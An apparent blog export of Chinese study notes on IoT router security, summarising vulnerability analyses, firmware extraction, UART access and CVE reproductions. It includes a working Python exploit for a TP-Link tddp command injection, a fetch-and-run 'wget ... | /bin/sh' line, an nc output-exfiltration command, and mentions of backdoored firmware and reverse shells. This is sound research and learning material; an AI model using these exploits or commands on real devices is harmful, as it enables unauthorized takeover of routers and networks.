<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ni跑飞了，是不是因为$lr=$pc？（exp成功了，所以是跑飞了</span></span><br><span class="line"><span class="comment"># 看到lr和pc相同时，就不要直接ni了，先在下条指令下断，再ni，避免跑飞（具体原理未知</span></span><br><span class="line"><span class="variable">$lr</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"><span class="variable">$pc</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"> →    0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">gef➤  b *0x13654</span><br><span class="line">Breakpoint 2 at 0x13654</span><br><span class="line">gef➤  ni</span><br></pre></td></tr></table></figure>
<ul>
<li><p>有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget</p>
<p>  其实可控 PC 后已经可以干很多事了，<code>upnpd</code> 内包含大量 <code>system</code> 函数调用，比如 <code>reboot</code></p>
<p>  ？？？</p>
<p>  开了aslr，则加载lib时，其基址会变，因此不可用，但是二进制本身的system可用，其本身加载基址不变吗，为什么ida中搜到的bl system地址，就可用，地址不会变吗？</p>
<p>  （物理地址与虚拟地址</p>
<p>  （NX与ASLR</p>
<p>  //here</p>
</li>
<li><p>无限制任意命令执行：wget http://{reverse_ip}:{reverse_port} -O-|/bin/sh，怎么用？//here</p>
</li>
<li><p>stack reuse为什么可行？//here</p>
<ul>
<li>局部变量的存储空间在每次函数调用时分配，在函数返回时释放</li>
<li>call_recvfrom函数中，通过recvfrom函数将接收的socket数据保存在call_recvfrom函数栈上的局部变量中，其没有初始化，故局部变量的值是不确定的，第一次send将expayload保存到局部变量中，此时会调用一次call_recvfrom函数，第二次send真正的payload，又会调用一次call_recvfrom函数，而“局部变量的存储空间在每次函数调用时分配，在函数返回时释放”，怎么来保证第二次send时，局部变量还保存着第一次send时的expayload？？？</li>
</ul>
</li>
</ul>
<blockquote>
<p> 参考</p>
<ul>
<li><a href="https://paper.seebug.org/1311/#8" target="_blank" rel="noopener">https://paper.seebug.org/1311/#8</a></li>
<li><a href="https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211" target="_blank" rel="noopener">https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211</a></li>
<li><a href="https://ssd-disclosure.com/#what-we-do" target="_blank" rel="noopener">https://ssd-disclosure.com/#what-we-do</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT安全-文章学习笔记-2</title>
    <url>/2021/06/21/iot/IOT%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="IOT安全-文章学习笔记-2"><a href="#IOT安全-文章学习笔记-2" class="headerlink" title="IOT安全-文章学习笔记-2"></a>IOT安全-文章学习笔记-2</h1><h2 id="CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析"><a href="#CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析" class="headerlink" title="CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析"></a>CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/250724" target="_blank" rel="noopener">https://www.anquanke.com/post/id/250724</a></p>
<ul>
<li>概要：静态资源路径的认证绕过、解密获取token、ping功能注入（猜的）、telnetd开关的配置项</li>
<li>用.w 为后缀的固件文件</li>
<li>由于漏洞是身份认证绕过漏洞，因此首先要确定设备的身份验证相关的函数有哪些</li>
<li>三种情况：0-验证通过、超时重新认证、2-新用户故需要认证</li>
<li>逻辑运算符&amp;&amp; 的优先级大于 ||</li>
<li>逻辑或，前面条件为真，则不看后者，即可以跳过evaluate_access</li>
<li>仅认证绕过还不够，还需httoken，httoken 是设备的token值，在服务端进行生成，然后前端js 中进行解密，最终向服务器请求的时候，将httoken加入到请求数据中</li>
<li>很多的网络设备中在ping网络诊断 这个功能中，出现过大量的历史漏洞</li>
<li>/sbin/arc_telnetd 文件中：获取ARC_TELNETD_ENABLE的值，当值为1的时候，设备会开启telnetd</li>
<li>通过前端静态资源的路径，来绕过身份验证</li>
</ul>
<h2 id="NetGear-夜鹰-RAX40V2-设备与固件分析"><a href="#NetGear-夜鹰-RAX40V2-设备与固件分析" class="headerlink" title="NetGear 夜鹰 RAX40V2 设备与固件分析"></a>NetGear 夜鹰 RAX40V2 设备与固件分析</h2><p><a href="https://www.anquanke.com/post/id/248900" target="_blank" rel="noopener">https://www.anquanke.com/post/id/248900</a></p>
<ul>
<li>概要：通过uart进入shell、开启telnet/修改密码获取网络层shell（uart是硬件层）、从设备中提取出文件系统、ubi提取固件</li>
<li>NetGear路由器：自带UART接口且已标明、波特率一般为115200</li>
<li>识别usb：ls -ll /dev/tty</li>
<li>识别波特率：devttys0 的小工具baudrate.py</li>
<li>minicom保存串口log 为文件（未说明，自行搜索）</li>
<li>弱口令进入uart的shell，但命令受限，类似这种低权限的shell，输入sh、\bin\sh、bash等命令可能会获取完整版的shell</li>
<li>telnet常见可执行文件：telnetd、utelnetd（之前还遇到过dropbear）</li>
<li>telnetd与UART，二者shell的用户名/密码可能不同</li>
<li>直接更改admin 用户的密码为空，原来：<code>admin:x:0:0:admin:/:/bin/sh</code>，改后<code>admin::0:0:admin:/:/bin/sh</code>（直接留空）</li>
<li>提取fs：cat /proc/mtd，可见mtd11对应rootfs-ubifs，可直接dd提取，dd if=/dev/mtd11 of=/tmp/rootfs_ubifs.bin（只if/of无需其它参数）</li>
<li>提取nvram，nvram show &gt; nvram.bin</li>
<li>解开ubi 文件有两种方法：挂载、使用 ubi_reader 套件</li>
</ul>
<h2 id="CVE-2020-26567-DSR-250N-远程拒绝服务漏洞分析"><a href="#CVE-2020-26567-DSR-250N-远程拒绝服务漏洞分析" class="headerlink" title="CVE-2020-26567 DSR-250N 远程拒绝服务漏洞分析"></a>CVE-2020-26567 DSR-250N 远程拒绝服务漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/247049" target="_blank" rel="noopener">https://www.anquanke.com/post/id/247049</a></p>
<ul>
<li>概要：手动提取squashfs、cgi中有reboot导致拒绝服务、httpd与cgi、cgi如何触发及未授权访问???</li>
<li>手动提取squashfs<ul>
<li>常见的头部特征：sqsh、hsqs、qshs、shsq、hsqt、tqsh、sqlz。</li>
<li>确定squashfs文件系统的大小：从 “hsqs”开始 dump 出一段数据（一般头部校验不超过100字节），file 命令查看</li>
</ul>
</li>
<li>拒绝服务：<ul>
<li>漏洞文件：upgradeStatusReboot.cgi中有reboot命令</li>
<li>如何触发：cgi文件伴随着http服务，找到web组件httpd，其调用路径：/etc/init.d/rcS、/etc/platformInit、sslvpnInit、httpd和httpkeepAlive.sh（前者的守护进程）</li>
<li>如何触发2：httpd在启动时会加载upgradeStatusReboot.cgi，且不需要授权就可访问（未授权访问是怎么体现的？启动时加载cgi就会被调用？）</li>
</ul>
</li>
<li>dsr-500<ul>
<li>thttpdInit：thttpd和httpkeepAlive.sh</li>
<li>kepler.config：定义了THHTP_CGI_PATTERN=”platfor.cgi|upgradeStatusReboot.cgi”</li>
<li>thttpd启动参数：thttpd -c THHTP_CGI_PATTERN，c指定了那些cgi文件（说明这些cgi可以未授权访问？）</li>
</ul>
</li>
<li><p>二者不同：250中httpd中加载了cgi文件，500中启动thttpd时参数指定了cgi</p>
</li>
<li><p>userInit 中，根据Country 设置安全等级，地区不同，漏洞触发点也不同</p>
</li>
</ul>
<h2 id="Linksys-EA6100-固件解密分析"><a href="#Linksys-EA6100-固件解密分析" class="headerlink" title="Linksys EA6100 固件解密分析"></a>Linksys EA6100 固件解密分析</h2><p><a href="https://www.anquanke.com/post/id/246659" target="_blank" rel="noopener">https://www.anquanke.com/post/id/246659</a></p>
<ul>
<li>概要：中间版本（未加密）可解密最新版本（加密）、gpg解密固件</li>
<li>从固件后缀名中获取信息<ul>
<li>以 “ .gpg.img” 为结尾的固件包，正常的固件包是以 “img”、“bin”、“chk” 为结尾</li>
<li>gpg：为文件生成签名、管理密钥以及验证签名的工具</li>
<li>固件可能是使用GPG生成的密钥进行加密的</li>
</ul>
</li>
<li>判定加密；熵值、binwalk、file</li>
<li>固件下载页面的提示<ul>
<li>更新最新固件的时候，需要先下载 Ver. 1.1.5 (Build 172244) 作为中间件</li>
<li>最新固件被加密，中间版本未加密（无gpg后缀）</li>
<li>中间版本用于提供密钥来解密最新的固件</li>
</ul>
</li>
<li>gpg密钥<ul>
<li>gpg参数k， -k, –list-keys            列出密钥</li>
<li>其它密钥保存格式：BEGIN RSA PRIVATE KEY私钥内容、BEGIN CERTIFICATE证书信息</li>
<li>搜索BEGIN RSA，找到密钥文件keydata</li>
</ul>
</li>
<li>gpg解密固件：import参数导入密钥、decrypt参数解密</li>
</ul>
<h2 id="NetGear-R7000P-路由器栈溢出漏洞硬件调试与分析"><a href="#NetGear-R7000P-路由器栈溢出漏洞硬件调试与分析" class="headerlink" title="NetGear R7000P 路由器栈溢出漏洞硬件调试与分析"></a>NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</h2><ul>
<li>概要：memcpy栈溢出、万用表识别uart、dslogic识别波特率、动态调试</li>
<li><p>确定uart</p>
<ul>
<li>gnd：指针wifi符号，黑色接地或任意金属，红色挨个试，听到声音便是（通导性测试）</li>
<li>vcc：指针20v，黑色接地，红色挨个试，出现最大电压值便是（若结果有两个，再与gnd相接，能重启便是）</li>
<li>tx/rx：指针20v，黑色接gnd，设备启动时，电压增大并保持不变是tx，电压为0是rx</li>
</ul>
</li>
<li><p>波特率3法：挨个试、python脚本、dslogic等硬件</p>
</li>
<li><p>dslogic使用</p>
<ul>
<li>接线：通道1接tx，黑色接gnd</li>
<li>pc上xcom软件模拟路由器</li>
<li>dslogic配套软件dsview</li>
<li>具体使用待学习</li>
</ul>
</li>
</ul>
<h2 id="一次嵌入式固件逆向实践"><a href="#一次嵌入式固件逆向实践" class="headerlink" title="一次嵌入式固件逆向实践"></a>一次嵌入式固件逆向实践</h2><ul>
<li>目录</li>
<li>ppc指令<ul>
<li>cmplwi-无符号立即数字比较：cmp-比较、l-无符号、w-word字、i-立即数、</li>
<li>slwi：slwi r0, r0, 8，即r0 = r0 &lt;&lt; 8，逻辑左移</li>
<li>addis：立即数左移16位后跟寄存器内容相加，s后缀表示左移16位</li>
</ul>
</li>
<li>法一：r11 = 0x70000+r3*4-0x4F0，即 jmp-基址+偏移 到跳转表，当r3为0即找第一个case</li>
<li>法二：最后一个跳转地址后面应该是第一个case语句跳转地址，即跳转表后紧跟着case代码块</li>
<li>sig库函数识别未实践过</li>
</ul>
<h2 id="DLink路由器固件的一次分析记录"><a href="#DLink路由器固件的一次分析记录" class="headerlink" title="DLink路由器固件的一次分析记录"></a>DLink路由器固件的一次分析记录</h2><ul>
<li>7z解压yyds</li>
<li>hnap基于http-soap，http协议中soapaction字段来表示不同的hnap请求，uri为/HNAP1</li>
<li>基础认证：请求头与环境变量的对应<ul>
<li>http请求中的基础认证，Authorization：Basic YWMEHZY+</li>
<li>环境变量中，http_hnap_auth = getenv(“HTTP_HNAP_AUTH”);</li>
</ul>
</li>
<li>过程：cgibin程序、hnap_handler、getenv、处理env_value、3处发生漏洞</li>
<li>C 库函数 char <em>strtok(char </em>str, const char *delim) 分解字符串 str, delim 为分隔符。<ul>
<li>该函数返回被分解的第一个子字符串，如果没有可检索的字符串，则返回一个空指针。</li>
<li>在第一次调用时，strtok()必需给予参数s 字符串，往后的调用则将参数s 设置成NULL<br>v22 = strtok(http_hnap_auth, “ “); # 第一次调用需给定s字符串<br>src = strtok(0, “ “); # 往后的调用s设置为null<br>假如原来为basic xxx,则第一次返回basic,第二次返回xxx</li>
</ul>
</li>
<li>atoi：atoi函数对于诸如此类的字符串:“12aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa”同样会成功的返回12</li>
</ul>
<h2 id="iot初体验-智能设备"><a href="#iot初体验-智能设备" class="headerlink" title="iot初体验-智能设备"></a>iot初体验-智能设备</h2><ul>
<li>思路：编程器连接flash获取固件、修改固件中uboot等待时间并刷回、uart连接并进入uboot</li>
<li>串口有两种标准，ttl和rs232，usb2ttl即将ttl的转为usb</li>
<li>那个xmc是flash，没有拆下来，直接接线连的编程器，提固件</li>
<li>识别出5个型号，不知道哪个就直接最后一个，猜？</li>
<li>固件内uboot（0-31000）挨着kernel（31000-）</li>
<li>不用非得dd提取出uboot再分析，直接拉入ida设置load size即可</li>
<li>判定基址时，差正好是20？怎么就判定是00那个而非20？（等作者解答，解答：jumptables中每个地址长度是4，103D0-103B0=0x20/4=8。，还是没懂）</li>
<li>怎么判断那个函数是等待时间的？仅凭文中代码不足以吧？</li>
</ul>
<h2 id="IoT设备固件分析教程之固件是怎么存储的"><a href="#IoT设备固件分析教程之固件是怎么存储的" class="headerlink" title="IoT设备固件分析教程之固件是怎么存储的"></a>IoT设备固件分析教程之固件是怎么存储的</h2><ul>
<li>名词：pcb-印刷电路板、soc片上系统</li>
<li>芯片识别：标签、封装/电路设计</li>
<li>nor与nand、emmc与ufs、</li>
<li>多种类型的存储器、不同类型的数据</li>
</ul>
<h2 id="记一次网关设备的pwn"><a href="#记一次网关设备的pwn" class="headerlink" title="记一次网关设备的pwn"></a>记一次网关设备的pwn</h2><ul>
<li>整体讲的比较粗，对新手不友好：模拟、exp、获取imagebase都没有详细步骤，等回头再来</li>
<li>修改html标签属性就能打开telnet？</li>
<li>mips流水线效应，jalr后的mov a2,s0优先执行</li>
<li>mips返回地址，$ra，return address（截图中没显示）</li>
<li>没必要非从理论上说明会栈溢出，直接调试跑一波即可验证（如果从理论上讲，sscanf导致从v4到a2，a2是参数，按照x86的参返旧局，参数被覆盖后并不会覆盖到返回地址，何况在此还不清楚mips函数调用时栈到底怎么排布）</li>
<li>exp怎么构造的？没细讲，也许是一边调试一边构造的，硬看不好理解</li>
<li>imagebase查看？：ida下断main、qemu的strace参数，没懂</li>
</ul>
<h2 id="2018-年-IoT-那些事儿"><a href="#2018-年-IoT-那些事儿" class="headerlink" title="2018 年 IoT 那些事儿"></a>2018 年 IoT 那些事儿</h2><ul>
<li>概述：非技术文章、详见原文目录</li>
<li><p>现状</p>
<ul>
<li>IoT 设备会越来越多，IoT 恶意样本数量爆炸式增长</li>
<li>被攻击后的设备，通常会进入黑客的武器库。</li>
<li>蠕虫感染或者自主的批量攻击来控制批量目标设备，构建僵尸网络</li>
<li>路由器、摄像头和智能电视被攻击频率最高</li>
</ul>
</li>
<li><p>IoT 攻击源</p>
<ul>
<li>欧美：IoT 恶意代码控制服务器的家乡</li>
<li>中国： IoT 攻击活动最频发的国家，也是最大的受害国</li>
<li>国内 ：与 GDP有关联性</li>
</ul>
</li>
<li><p>DDoS是IoT 恶意软件的主流功能，受青睐的四个原因：</p>
<ul>
<li>几何级数暴增</li>
<li>跨多平台传播</li>
<li>TB 级流量攻击</li>
<li>慢速 CC 攻击</li>
</ul>
</li>
<li><p>攻击方式：</p>
<ul>
<li>利用服务器进行集中式扫描攻击，并向 IoT 设备植入恶意软件</li>
<li>通过蠕虫传播攻击，如弱口令和漏洞利用</li>
</ul>
</li>
<li><p>IoT 安全趋势：</p>
<ul>
<li>针对 IoT 设备的攻击量将远远超过其他攻击目标</li>
<li>传统安全的防御形式被打破，迫使安全厂商思考新的防御思路</li>
<li>被攻击 IoT 的设备将呈现多样化</li>
<li>IoT 设备将成为恶意挖矿软件和勒索软件的下一个目标</li>
<li>攻击将越来越专业化，政治目的的攻击变多</li>
</ul>
</li>
<li><p>防护建议</p>
<ul>
<li>个人用户：修改默认密码、更新固件、不将端口向互联网开放</li>
<li>IoT 厂商：安全启动（通过证书来验证程序）、及时打补丁、云端服务器安全（数据和服务）、加密实现数据安全、动态密钥而非硬编码</li>
</ul>
</li>
</ul>
<h2 id="由一道工控路由器固件逆向题目看命令执行漏洞"><a href="#由一道工控路由器固件逆向题目看命令执行漏洞" class="headerlink" title="由一道工控路由器固件逆向题目看命令执行漏洞"></a>由一道工控路由器固件逆向题目看命令执行漏洞</h2><p><a href="https://www.anquanke.com/post/id/183202" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183202</a></p>
<ul>
<li>处理 tddp 协议的二进制文件：usr/bin/tddp、UDP的1040 端口</li>
<li><p>漏洞点：</p>
<ul>
<li>switch-case的 0x31分支，即 <code>CMD_FTEST_CONFIG</code> </li>
<li>sscanf 函数解析后，拼接到 run_exec 函数，过滤不严，只判断了 ; 字符，没有过滤 &amp; 和 | </li>
<li>run_exec 函数，调用了 execve 进行命令执行</li>
<li>回溯输入点：recvfrom 函数接收 socket 数据</li>
</ul>
</li>
<li><p>根据代码，构造出结构体空间布局</p>
</li>
<li><p>nmap 的 UDP 扫描，1040是开放的，TCP 扫描则端口是关闭的</p>
</li>
<li><p>exp</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">tddp_port = <span class="number">1040</span></span><br><span class="line">recv_port = <span class="number">12345</span></span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>)<span class="comment"># UDP 的 socket</span></span><br><span class="line">s_recv = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s_recv.bind((<span class="string">''</span>,<span class="number">12345</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'x01x31'</span>.ljust(<span class="number">12</span>,<span class="string">'x00'</span>) <span class="comment"># 前两个字节\0x1\0x31，中间要填充 10，原因是v21指针会后移 12 位</span></span><br><span class="line">payload+= <span class="string">"123|%s&amp;&amp;echo ;123"</span>%(command)<span class="comment"># ;后还要填充字符，因为sscanf后,会判断 ; 后面的内容是否为空</span></span><br><span class="line"></span><br><span class="line">s_send.sendto(payload,(ip,tddp_port))</span><br><span class="line">s_send.close()</span><br><span class="line"></span><br><span class="line">res,addr = s_recv.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
<ul>
<li><p>命令执行回显结果</p>
<ul>
<li><p>telnetd：能够连接上，但执行命令失败，因为远程没有用于 telnet 服务的终端</p>
</li>
<li><p>nc：尝试用 nc 来弹shell ，但nc被阉割</p>
</li>
<li>nc：将命令的内容正向连接来输出，本地监听nc -nvlp 6666，命令为”uname|nc ip 6666”，执行结果就会显示在本地</li>
</ul>
</li>
<li><p>另一个洞：注入一个合法的 lua 脚本，让程序去访问也可执行命令</p>
</li>
</ul>
<h2 id="强网杯2020决赛-ciscoRV110W-web服务漏洞复现"><a href="#强网杯2020决赛-ciscoRV110W-web服务漏洞复现" class="headerlink" title="强网杯2020决赛 ciscoRV110W web服务漏洞复现"></a>强网杯2020决赛 ciscoRV110W web服务漏洞复现</h2><ul>
<li>确定目标程序：grep字符串（配置页面的url即/login.cgi）、netstat看443端口对应进程，再find找出差呢刚需</li>
<li>漏洞对比找到sscanf</li>
<li>分析程序，找到漏洞触发的请求，远程调试确定偏移</li>
<li>ret2libc+shellcode：msfvenom生成shellcode、利用多线程同一个脚本中攻击及接受反弹shell</li>
</ul>
<h2 id="路由器篡改固件添加后门"><a href="#路由器篡改固件添加后门" class="headerlink" title="路由器篡改固件添加后门"></a>路由器篡改固件添加后门</h2><ul>
<li>目录</li>
<li>bindshell后门</li>
<li>其他均常规操作，平平无奇</li>
</ul>
<h2 id="通过设备UART接口调试获取shell"><a href="#通过设备UART接口调试获取shell" class="headerlink" title="通过设备UART接口调试获取shell"></a>通过设备UART接口调试获取shell</h2><ul>
<li>目录</li>
<li>uart识别未实践过、芯片查询网站</li>
<li>揭秘一书中：<ul>
<li>目测法（vcc方形、gnd多条线）</li>
<li>测试法（vcc电压稳定、gnd电阻为0、txd电压下降、rxd排除法</li>
</ul>
</li>
</ul>
<h2 id="IoT漏洞研究（一）固件基础"><a href="#IoT漏洞研究（一）固件基础" class="headerlink" title="IoT漏洞研究（一）固件基础"></a>IoT漏洞研究（一）固件基础</h2><ul>
<li>IOT固件分两类<ul>
<li>存在文件系统，基于linux/BSD</li>
<li>固件是一个整体，即RTOS，Real-time operating system</li>
</ul>
</li>
<li><p>存在文件系统</p>
<ul>
<li>UBI</li>
<li>PFS</li>
<li>Openwrt Lua</li>
</ul>
</li>
<li><p>RTOS</p>
<ul>
<li>固件本身就是一个可执行文件，不存在文件系统，启动后直接加载运行</li>
<li>RTOS的分析最重要两点：程序入口、 程序符号</li>
<li>vxworks</li>
<li>U-boot</li>
<li>Chip firmware</li>
</ul>
</li>
<li>Chip firmware<ul>
<li>有些IOT固件没有资料，逆向困难，需要对固件整体分析</li>
<li>0x100的位置：都是0x2xxxxx，既非代码也非数据，推测是地址，即此处是地址表</li>
<li>猜测基址为0x200000，rebase后，识别出许多类似函数名的字符串</li>
<li>搜索字符串地址，固件中找到，结合基址找到在IDA中位置，即字符串表</li>
<li>如上，地址表，字符串表都是重要线索</li>
</ul>
</li>
<li>未完待续</li>
</ul>
<h2 id="僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现"><a href="#僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现" class="headerlink" title="僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现"></a>僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现</h2><ul>
<li>sprintf+system命令注入</li>
<li>分号拼接命令</li>
<li>cmd溯源到用户输入</li>
<li>源追溯，依据printf函数，判定为uri</li>
</ul>
<h2 id="复现影响79款Netgear路由器高危漏洞"><a href="#复现影响79款Netgear路由器高危漏洞" class="headerlink" title="复现影响79款Netgear路由器高危漏洞"></a>复现影响79款Netgear路由器高危漏洞</h2><ul>
<li>概述：栈溢出、串口连接、00绕strcmp、rop链</li>
<li>串口连接：<ul>
<li>Hyper Terminal软件、TTL转USB转接板</li>
<li>一般情况：1-连接杜邦线-router、2-连接USB-pc、3-打开Hyper Terminal、4-开启路由器、5-Hyper Terminal显示数据</li>
<li>有时会获取不到信息，故先usb再杜邦线-先2后1，有类似的坑</li>
</ul>
</li>
<li>exp<ul>
<li>strcmp(src,”*#</li>
<li>函数返回：pop {R4-R11, PC}</li>
<li>栈布局：a、b、c</li>
<li>ROP：MOV R0,SP; BL system</li>
<li>a给R4-R11、b给PC、pop完ab后，SP执行c，即system的R0即cmd</li>
</ul>
</li>
<li>ROP<ul>
<li>优先本程序，其次libc</li>
<li>找MOV R0,SP类似的rop</li>
<li>1：栈布局+函数返回，能控制sp指向cmd</li>
<li>2：sp赋值r0，作为system参数</li>
</ul>
</li>
</ul>
<h2 id="复现｜路由器命令执行"><a href="#复现｜路由器命令执行" class="headerlink" title="复现｜路由器命令执行"></a>复现｜路由器命令执行</h2><ul>
<li>模拟，过程很完整，ssh连接了qemu，多个终端，一个起进程，另一个可ps等</li>
<li>分析，通过端口找进程，4种方法见另篇文章</li>
<li>扩展，内网扩大到外网，利用csrf</li>
</ul>
<h2 id="复现｜摄像头固件重打包"><a href="#复现｜摄像头固件重打包" class="headerlink" title="复现｜摄像头固件重打包"></a>复现｜摄像头固件重打包</h2><ul>
<li>思路很清晰，看目录</li>
<li>docker版qemu</li>
<li>重要的是固件上传的校验及绕过（校验的是uimage，即uboot</li>
<li>自己编译一个后门程序，还有利用现成的，如utelnet等</li>
<li>固件重打包：mksquashfs、mkimage、还注意加载基址和入口点</li>
</ul>
<h2 id="漏洞组合拳劫持门禁控制系统"><a href="#漏洞组合拳劫持门禁控制系统" class="headerlink" title="漏洞组合拳劫持门禁控制系统"></a>漏洞组合拳劫持门禁控制系统</h2><ul>
<li>认证绕过<ul>
<li>cookie文件目录遍历+未认证文件上传</li>
<li>通过 cookie进行认证，http中cookie对应服务端上的cookie文件</li>
<li>文件上传功能不需要认证，可伪造一个cookie文件上传</li>
<li>目录遍历找到上传的伪造cookie文件，即可通过认证</li>
</ul>
</li>
<li>持久化后门<ul>
<li>文件上传 + 命令注入（二者都需认证绕过）</li>
<li>可上传用户照片，仅限制图片后缀，并没检查文件内容</li>
<li>设置ntp服务器，存在命令注入，但长度受限</li>
<li>构造恶意脚本、上传脚本、注入点执行脚本</li>
<li>后门：交互式（有回显）的命令执行，类似shell。恶意脚本在cookie中放置待执行命令</li>
<li>持久化：每次开机都会执行，不能断电失效，如tmp目录。配置ntp后重启生效，在启动时会解析配置</li>
</ul>
</li>
<li>漏洞利用链<ul>
<li>共4个漏洞，前2组合成认证绕过，全部组合成持久化后门</li>
<li>目录遍历实现数据读取，文件上传实现数据写入</li>
<li>别轻视低危漏洞，找到读写原语，实现组合漏洞</li>
</ul>
</li>
</ul>
<h2 id="Flash-Dump技术解析"><a href="#Flash-Dump技术解析" class="headerlink" title="Flash Dump技术解析"></a>Flash Dump技术解析</h2><ul>
<li>思路清晰，见目录</li>
<li>flash中的固件一般不加密，且从flash中提取法比较通用</li>
<li>拆卸、焊接、读取的硬件工具</li>
<li>基于统计法修复数据、nand会有ecc校验位</li>
</ul>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
        <tag>摄像头</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Tenda溢出漏洞-CVE-2018-18708分析</title>
    <url>/2021/06/11/iot/Tenda%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-CVE-2018-18708%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="Tenda溢出漏洞-CVE-2018-18708分析"><a href="#Tenda溢出漏洞-CVE-2018-18708分析" class="headerlink" title="Tenda溢出漏洞-CVE-2018-18708分析"></a>Tenda溢出漏洞-CVE-2018-18708分析</h2><ul>
<li>识别main</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">int start()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> ((int (__fastcall *)(int (__fastcall *)(int, int)))_uClibc_main)(sub_2E420);</span><br><span class="line">&#125;</span><br><span class="line">int __fastcall sub_2E420(int a1, int a2)</span><br><span class="line"><span class="comment"># rename为main后，2参转为3参</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br></pre></td></tr></table></figure>
<ul>
<li>判断函数功能：get_data_from_http</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过多处的调用</span></span><br><span class="line"><span class="comment"># 字符串应该是http请求中各参数</span></span><br><span class="line"><span class="comment"># 判定为：从http请求中获取相应数据，rename为get_data_from_http</span></span><br><span class="line">v17 = sub_2BA8C(a1, <span class="string">"deviceList"</span>, &amp;unk_F5124);</span><br><span class="line">v9 = sub_2BA8C(a1, <span class="string">"user"</span>, &amp;unk_DB2A0);</span><br><span class="line">s1 = sub_2BA8C(a1, <span class="string">"password"</span>, &amp;unk_DB2A0);</span><br><span class="line">s2 = sub_2BA8C(a1, <span class="string">"passconf"</span>, &amp;unk_DB2A0);</span><br><span class="line">v6 = sub_2BA8C(a1, <span class="string">"group"</span>, &amp;unk_DB2A0);</span><br><span class="line">v5 = sub_2BA8C(a1, <span class="string">"enabled"</span>, &amp;unk_DB2A0);</span><br><span class="line">v4 = sub_2BA8C(a1, <span class="string">"ok"</span>, &amp;unk_DB2A0);</span><br><span class="line"></span><br><span class="line">v4 = sub_2BA8C(a1, <span class="string">"user"</span>, &amp;unk_DB2A0);</span><br><span class="line">v3 = sub_2BA8C(a1, <span class="string">"ok"</span>, &amp;unk_DB2A0);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>确定调用链中的分支跳转</p>
<ul>
<li><p>aaa_Handle_net调用vuln6：IDA反编译视图，可直接确定有无分支</p>
</li>
<li><p>6调用5：若有分支，qemu -g 1234、IDA中gdb远程调试，动态确定（如Vuln6到Vuln5有一个if，if和调用Vuln5处均下断，F9可从if直接跑到Vuln5，说明有分支判断，但已经满足</p>
</li>
<li><p><strong><em>5调用4：Vuln5是否会调用vuln_4_formSetMacfiltercfg？他所讲不知云云，按上述静态分析得知无分支，动态调试时运行到此时，  ，就会卡住，等一会报错，why？这个被执行了吗？暂且搁置</em></strong></p>
</li>
<li><p>4调用3：</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-13-033031.jpg" alt="image-20200513111459808"></p>
</li>
<li><p>3调用2，2调用Vuln：由反编译窗口可见都会成立</p>
</li>
<li><p>Vuln：检测a1（一直追溯就是deviceList）是否包含’r’，随后进入分支，执行strpcy触发溢出</p>
</li>
</ul>
</li>
<li><p>逆向追踪数据流：</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命名规则：my_vulnee、my_vulner、my_caller1、my_caller2、、、</span></span><br><span class="line">my_caller5_main</span><br><span class="line">my_caller4</span><br><span class="line">my_caller3</span><br><span class="line">my_caller2_formSetMacFilterCfg000</span><br><span class="line">my_caller1</span><br><span class="line">my_vulner</span><br><span class="line">my_vulnee</span><br></pre></td></tr></table></figure>
<ul>
